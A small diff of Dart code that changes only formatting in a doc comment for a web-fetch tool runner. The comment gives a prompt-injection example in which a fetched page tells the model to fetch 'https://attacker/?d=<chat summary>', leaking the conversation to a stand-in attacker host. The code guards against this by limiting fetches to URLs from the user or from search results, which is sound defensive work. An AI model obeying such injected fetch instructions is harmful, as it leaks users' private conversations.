@@ -91,7 +91,7 @@ Set<String> urlsIn(String text) =>
 
 /// web_fetch may only open URLs the user wrote or a web_search returned.
 /// Otherwise a fetched page could instruct the model to "fetch
-/// https://attacker/?d=<chat summary>" and leak the conversation.
+/// `https://attacker/?d=<chat summary>`" and leak the conversation.
 ToolRunner webToolRunner(http.Client client, String apiKey,
     {Set<String> userUrls = const {}}) {
   final fetchable = {...userUrls};
